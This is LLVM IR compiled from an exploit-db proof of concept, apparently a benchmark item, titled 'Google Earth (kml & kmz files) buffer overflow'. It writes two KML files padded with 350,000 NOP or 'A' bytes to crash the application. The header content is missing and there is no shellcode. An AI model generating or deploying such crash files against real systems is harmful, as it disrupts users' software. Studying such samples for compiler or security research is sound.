; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_28785.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_28785.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [49 x i8] c"Google Earth (kml & kmz files) buffer overflow \0A\00", align 1
@.str.1 = private unnamed_addr constant [42 x i8] c" by JAAScois [ http://www.jaascois.com ]\0A\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"Gkml.kml\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"w+b\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"-Error: fopen \0A\00", align 1
@xmlHdr = common dso_local global i8* null, align 8
@xmlHdr2 = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [10 x i8] c"GkmlX.kml\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c"- Created file: Gkml.kml ...OK\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0))
  %11 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.1, i64 0, i64 0))
  %12 = call i32* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0))
  store i32* %12, i32** %6, align 8
  %13 = load i32*, i32** %6, align 8
  %14 = icmp eq i32* %13, null
  br i1 %14, label %15, label %17

15:                                               ; preds = %2
  %16 = call i32 @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %69

17:                                               ; preds = %2
  %18 = load i8*, i8** @xmlHdr, align 8
  %19 = load i8*, i8** @xmlHdr, align 8
  %20 = call i32 @strlen(i8* %19)
  %21 = load i32*, i32** %6, align 8
  %22 = call i32 @fwrite(i8* %18, i32 %20, i32 1, i32* %21)
  store i8 -112, i8* %9, align 1
  store i32 0, i32* %8, align 4
  br label %23

23:                                               ; preds = %29, %17
  %24 = load i32, i32* %8, align 4
  %25 = icmp slt i32 %24, 350000
  br i1 %25, label %26, label %32

26:                                               ; preds = %23
  %27 = load i32*, i32** %6, align 8
  %28 = call i32 @fwrite(i8* %9, i32 1, i32 1, i32* %27)
  br label %29

29:                                               ; preds = %26
  %30 = load i32, i32* %8, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %8, align 4
  br label %23

32:                                               ; preds = %23
  %33 = load i8*, i8** @xmlHdr2, align 8
  %34 = load i8*, i8** @xmlHdr2, align 8
  %35 = call i32 @strlen(i8* %34)
  %36 = load i32*, i32** %6, align 8
  %37 = call i32 @fwrite(i8* %33, i32 %35, i32 1, i32* %36)
  %38 = load i32*, i32** %6, align 8
  %39 = call i32 @fclose(i32* %38)
  %40 = call i32* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0))
  store i32* %40, i32** %7, align 8
  %41 = load i32*, i32** %7, align 8
  %42 = icmp eq i32* %41, null
  br i1 %42, label %43, label %45

43:                                               ; preds = %32
  %44 = call i32 @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %69

45:                                               ; preds = %32
  %46 = load i8*, i8** @xmlHdr, align 8
  %47 = load i8*, i8** @xmlHdr, align 8
  %48 = call i32 @strlen(i8* %47)
  %49 = load i32*, i32** %7, align 8
  %50 = call i32 @fwrite(i8* %46, i32 %48, i32 1, i32* %49)
  store i8 65, i8* %9, align 1
  store i32 0, i32* %8, align 4
  br label %51

51:                                               ; preds = %57, %45
  %52 = load i32, i32* %8, align 4
  %53 = icmp slt i32 %52, 350000
  br i1 %53, label %54, label %60

54:                                               ; preds = %51
  %55 = load i32*, i32** %7, align 8
  %56 = call i32 @fwrite(i8* %9, i32 1, i32 1, i32* %55)
  br label %57

57:                                               ; preds = %54
  %58 = load i32, i32* %8, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %8, align 4
  br label %51

60:                                               ; preds = %51
  %61 = load i8*, i8** @xmlHdr2, align 8
  %62 = load i8*, i8** @xmlHdr2, align 8
  %63 = call i32 @strlen(i8* %62)
  %64 = load i32*, i32** %7, align 8
  %65 = call i32 @fwrite(i8* %61, i32 %63, i32 1, i32* %64)
  %66 = load i32*, i32** %7, align 8
  %67 = call i32 @fclose(i32* %66)
  %68 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %69

69:                                               ; preds = %60, %43, %15
  %70 = load i32, i32* %3, align 4
  ret i32 %70
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
